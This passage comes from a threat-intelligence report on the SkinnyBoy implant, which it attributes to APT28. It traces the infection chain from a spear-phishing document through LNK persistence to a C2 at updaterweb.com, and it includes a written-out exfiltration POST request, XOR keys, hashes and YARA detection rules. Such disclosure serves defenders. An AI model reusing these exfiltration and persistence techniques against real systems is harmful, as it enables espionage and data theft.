Presumably operating since the\n\nmid-2000s, its techniques, tactics, and procedures are compatible with a state-sponsored threat\n\nactor. The group usually targets companies and organizations operating in the military,\n\ngovernment, and diplomatic sectors, and security organizations aligned with the NATO\n\nobjectives.\n\nThis adversary can adopt different techniques and tactics to obtain initial access to the victim's\n\nsystem. Among these there are certainly:\n\n_1._ _Watering hole attacks against compromised websites frequently visited by targets_\n\n_2. [Exploit kit / 0day and common vulnerabilities used to infect targets\n]_\n\n_3._ _Social engineering techniques, such as spear-phishing email messages_\n\n_4. [Credential Theft\n]_\n\nHowever, even though these techniques can sometimes be very evolved, it is not unusual to\n\nobserve and correlate less sophisticated activities aimed at obtaining a foothold in the targeted\n\nperimeter.\n\nIndeed, APT28 / Fancy Bear has been observed quite often updating their tools and malware\n\nimplants. While over time it was possible to notice substantial increases in sophistication even\n\namong different samples of the same malware family, other times the level of sophistication was\n\nsignificantly lower than expected.\n\n**4** | 2021 C b Th t I t lli R h © Cl t 25\n\n\n-----\n\nConsidering the group's capabilities, the tactic of significantly lowering these levels becomes\n\nfunctional with an attempt to deceive the APT nature of the sample and make any attribution\n\neffort more complex.\n\nThis is the case of the last implant observed by our research team which has a rather low level of\n\nsophistication and basic operating logic even if fully operational and functional. This implant,\n\nwhich is still unreported at the time of writing, has been internally called **_SkinnyBoy and its_**\n\nattribution goes to APT28/Fancy Bear group after months of observations.\n\nBefore analyzing this sample, we found out it was uploaded on a popular online platform and\n\ndetected only by Microsft Defender engine as belonging to the \"AceLog\" family.\n\nDuring our analysis, we came to the conclusion that this implant was used to target military and\n\ngovernment institutions.\n\n**5** | 2021 C b Th t I t lli R h © Cl t 25\n\n\n-----\n\n#### 02 ADVERSARY OPERATIONAL SECURITY  \n\nDuring the analysis of the campaign, the adversary was observed using commercial VPN\n\nservices as part of their OPsec in order to hide thier tracks. The same VPN services were used to\n\npurchase and manage their infrastructure during this campaign, according to the simplified\n\nscheme shown below:\n\nFig. 1 - Adversary connectivity schema\n\n**6** | 2021 C b Th t I t lli R h © Cl t 25\n\n\n-----\n\n# INFECTION CHAIN\n\n\n#### Comparable with previous APT28 /\n\n Fancy Bear attacks, the actor used\n\n spear-phishing techniques to deliver\n\n multi-staged infection chains with at\n\n least two different drop points.  \n\n\n-----\n\n#### 01 VECTOR AND FIRST STAGE  \n\nThe vector of the infection is a spear phishing email delivering a Word Office document with a\n\nsignificant name **related to an International Conference. Both the vector and its naming are**\n\nconsistent with APT28 / FancyBear TTPs.\n\nAs expected, the document triggers a MACRO function able to extract a Microsoft Dynamic Link\n\nLibrary (DLL) which then acts as downloader of a **_SkinnyBoy dropper (tdp1.exe) from a first_**\n\ndropurl.\n\n#### 02 SKINNYBOY DROPPER  \n\n**_tpd1.exe_** is the second stage of the infection. Once downloaded in the victim's file system, it\n\nextracts all the components necessary to set persistence and trigger the following malicious\n\noperations. The extracted payload is encoded in Base64 format and appended as an overlay in\n\nthe executable file.\n\nFig. 2 - Overlay of tpd1.exe\n\n**8** | 2021 C b Th t I t lli R h © Cl t 25\n\n\n-----\n\nAt the time of execution, the malicious process decodes the payload and, starting from it, writes\n\ntwo different files on the filesystem, then deletes itself. The dropped files are:\n\n-C:\\Users\\%username%\\AppData\\Local\\devtmrn.exe\n\n(2a652721243f29e82bdf57b565208c59937bbb6af4ab51e7b6ba7ed270ea6bce)\n\n- C:\\Users\\%username%\\AppData\\Local\\Microsoft\\TerminalServerClient\\TermSrvClt.dll\n\n(ae0bc3358fef0ca2a103e694aa556f55a3fed4e98ba57d16f5ae7ad4ad583698)\n\nThe names of the dropped files and of the created folder are stored in the executable in a\n\nencrypted way. The actor used a different XOR key for each string used. Some of these\n\nassociations are shown in the following table.\n\n**CLEAR STRING** **USED XOR KEY**\n\nMicrosoft MV$)fjgkl\n\nTerminalServerClient KV*#4u8K#HdefnNFn4fg\n\nTermSrvClt.dll IOJ$C#83r#rji2\n\nTab. 1 - Used XOR keys\n\nTo stay under the radar, the malware never executes the extracted files. Instead, it creates a\n\npersistence mechanism on the infected machine which allows a delayed execution of the next\n\nstages.\n\nIt creates a LNK file under Windows Startup folder (%appdata%\\Microsoft\\Windows\\Start\n\nMenu\\Programs\\Startup), named **_devtmrn.lnk, which points to the extracted malware_**\n\n**_devtmrn.exe._**\n\nThe creation of the link file occurs through a Windows COM object instantiated using the\n\n**_CoCreateInstance WinAPI function, passing the CLSID associated to LNK files as argument._**\n\n**9** | 2021 C b Th t I t lli R h © Cl t 25\n\n|CLEAR STRING|USED XOR KEY|\n|---|---|\n|Microsoft|MV$)fjgkl|\n|TerminalServerClient|KV*#4u8K#HdefnNFn4fg|\n|TermSrvClt.dll|IOJ$C#83r#rji2|\n\n\n-----\n\nFig. 3 - Part of the routine used to create LNK file\n\n(HKEY_CLASSES_ROOT\\.lnk\\ShellEx\\{000214F9-0000-0000-C000-000000000046})\n\n#### 03 SKINNYBOY LAUNCHER  \n\nOnce the machine reboots, the LNK file, placed into system's Startup folder, triggers the\n\nexecution of the devtmrn.exe executable, which simply acts as a launcher of the main implant.\n\nWhen launched, it only checks the existence of the following path\n\n**_C:\\Users\\%username%\\AppData\\Local\\Microsoft\\TerminalServerClient\\TermSrvClt.dll_**\n\nand starts a new process invoking the first DLL exported function, named RunMod.\n\n**10** | 2021 C b Th t I t lli R h © Cl t 25\n\n\n-----\n\nTo identify the right DLL to launch, the executable calculates the SHA256 hashes of each\n\nfilename into **_C:\\Users\\%username%\\AppData\\Local comparing each one of them with the_**\n\npre-computed SHA256 of the string TermSrvClt.dll, which is:\n\nF4 EB 56 52 AF 4B 48 EE 08 FF 9D 44 89 4B D5 66 24 61 2A 15 1D 58 14 F9 6D 97 13 2C 6D 07 6F 86\n\nHashes are calculated through classic WinAPI functions, such as **CryptHashData and**\n\n**CryptGetHashParam, as illustrated in the following figure.**\n\nFig. 4 - Hash checking routine\n\n\n\n**11** | 2021 C b Th t I t lli R h © Cl t 25\n\n\n-----\n\n#### 04 SKINNYBOY IMPLANT  \n\nThe DLL executable, named **_TermSrvClt.dll,_** corresponds to the main implant of the infection\n\nchain. It exfiltrates information about the infected system and retrieves and launches the final\n\npayload.\n\nOnce triggered, the process executes two Windows utilities to gather information about the\n\nsystem, systeminfo.exe and tasklist.exe. subsequently, it extracts a list of filenames contained\n\nin a subset of interesting directories, which are:\n\n- C:\\Users\\%username%\\Desktop\n\n- C:\\Program Files\n\n- C:\\Program Files (x86)\n\n- C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start\n\nMenu\\Programs\\Administrative Tools\n\n- C:\\Users\\%username%\\AppData\\Roaming\n\n- C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Templates\n\n- C:\\Windows\n\n- C:\\Users\\user\\AppData\\Local\\Temp\n\nThe output of this phase is concatenated using a fixed structure, which is then sent to the\n\nCommand and Control, **_updaterweb[.]com, using a POST request with the following body_**\n\nschema:\n\n**12** | 2021 C b Th t I t lli R h © Cl t 25\n\n\n-----\n\nTab. 2 - First POST request\n\nBefore being encoded in Base64, the previously extracted information is organized according to\n\nthe following structure:\n\n**13** | 2021 C b Th t I t lli R h © Cl t 25\n\n\n-----\n\nTab. 3 - POST body structure\n\n**14** | 2021 C b Th t I t lli R h © Cl t 25\n\n\n-----\n\nAfter completing the first HTTPS POST request containing the gathered information, the malware\n\ncontacts the C2 again in order to retrieve the next payload. The new POST request is structured\n\nas follow:\n\nPOST https://updaterweb.com/ HTTP/1.1\n\nUser-Agent: Opera\n\nHost: updaterweb.com\n\nContent-Length: 37\n\nCache-Control: no-cache\n\nid={MACHINE_NAME}#{USERNAME}#{DISK_VOLUME_SERIAL}&cmd=y\n\nTab. 4 - Second POST request\n\nTo avoid static detection, the format strings used to build the POST request body are XORED\n\nusing two different keys, as seen in the previous stage.\n\n**CLEAR STRING** **USED XOR KEY**\n\nid=%s#%s#%u&current=%s&total=%s&data= qpzoamxiendufbtbf3\n#$*40fvnpwOPDwdkvn\n\nid=%s#%s#%u&cmd=y CEJ&V%$84k839y92m\n\nTab. 5 - Other XOR keys\n\n**15** | 2021 C b Th t I t lli R h © Cl t 25\n\n|CLEAR STRING|USED XOR KEY|\n|---|---|\n|id=%s#%s#%u&current=%s&total=%s&data=|qpzoamxiendufbtbf3- #$*40fvnpwOPDwdkvn|\n|id=%s#%s#%u&cmd=y|CEJ&V%$84k839y92m|\n\n\n-----\n\nFinally, the Command and Control should reply with the next DLL that will be executed,\n\nrepresenting the final stage of the infection, which probably manifests backdoor behaviors.\n\nBy statically analyzing the TermSrvClt.dll compiled code, we can assume that once the server\n\ncorrectly replies, it stores the downloaded file in %TEMP% folder, self-injecting and executing it in\n\nmemory using the LoadLibrary and GetProcAddress WinAPIs.\n\nThe downloaded file is then deleted to covert the infection tracks.\n\nFig. 5 - Part of DLL loading\n\n**16** | 2021 C b Th t I t lli R h © Cl t 25\n\n\n-----\n\n# ATTRIBUTION \n\n#### After a period of observation of the\n\n described threat and an in-depth analysis\n\n of the identified victimology, Cluster25\n\n team attributes the SkinnyBoy implant\n\n and the related attack to Russian Group\n\n known as APT28 / FancyBear with a mid-\n\n to-high confidence.\n\n\n-----\n\n|TACTIC|TECHNIQUE|NAME|\n|---|---|---|\n|Execution|T1059|Command and Scripting Interpreter|\n||T1204|User Execution|\n|Persistence|T1547|Boot or Logon Initialization Scripts|\n|Defense Evasion|T1140|Deobfuscate/Decode Files or Information|\n|Discovery|T1057|Process Discovery|\n||T1082|System Information Discovery|\n||T1083|File and Directory Discovery|\n|Collection|T1005|Data From Local System|\n||T1119|Automated Collection|\n|Command and Control|T1071|Application Layer Protocol|\n||T1132|Data Encoding|\n|Exfiltration|T1020|Automated Exfiltration|\n||T1041|Exfiltration over C2 Channel|\n\n\n# ATT&CK MATRIX \n\n**TACTIC** **TECHNIQUE** **NAME**\n\n**T1059** Command and Scripting Interpreter\n\n**Execution**\n\n**T1204** User Execution\n\n**Persistence** **T1547** Boot or Logon Initialization Scripts\n\n**T1140** Deobfuscate/Decode Files or Information\n**Defense Evasion**\n\n**T1057** Process Discovery\n\n**Discovery** **T1082** System Information Discovery\n\n**T1083** File and Directory Discovery\n\n**T1005** Data From Local System\n\n**Collection**\n\n**T1119** Automated Collection\n\n**T1071** Application Layer Protocol\n\n**Command and Control**\n\n**T1132** Data Encoding\n\n**T1020** Automated Exfiltration\n\n**Exfiltration**\n\n**T1041** Exfiltration over C2 Channel\n\n\n-----\n\n# DETECTION RULE \n\n#### SkinnyBoy Dropper [YARA]  \n\nrule APT28_SkinnyBoy_Dropper: RUSSIAN THREAT ACTOR {\nmeta:\nauthor = \"Cluster25\"\nhash1 = \"12331809c3e03d84498f428a37a28cf6cbb1dafe98c36463593ad12898c588c9\"\nstrings:\n$ = \"cmd /c DEL \" ascii\n$ = \" \\\"\" ascii\n$ = {8a 08 40 84 c9 75 f9}\n$ = {0f b7 84 0d fc fe ff ff 66 31 84 0d fc fd ff ff}\ncondition:\n(uint16(0) == 0x5A4D and all of them)\n}\n\n\n-----\n\n# DETECTION RULE \n\n#### SkinnyBoy Launcher [YARA]\n \n\nrule APT28_SkinnyBoy_Launcher: RUSSIAN THREAT ACTOR {\n\nmeta:\n\nauthor = \"Cluster25\"\n\nhash1 =\"2a652721243f29e82bdf57b565208c59937bbb6af4ab51e7b6ba7ed270ea6bce\"\n\nstrings:\n\n$sha = {F4 EB 56 52 AF 4B 48 EE 08 FF 9D 44 89 4B D5 66 24 61 2A 15 1D 58 14 F9 6D 97\n\n13 2C 6D 07 6F 86}\n\n$l1 = \"CryptGetHashParam\" ascii\n\n$l2 = \"CryptCreateHash\" ascii\n\n$l3 = \"FindNextFile\" ascii\n\n$l4 = \"PathAddBackslashW\" ascii\n\n$l5 = \"PathRemoveFileSpecW\" ascii\n\n$h1 = {50 6A 00 6A 00 68 0C 80 00 00 FF ?? ?? ??
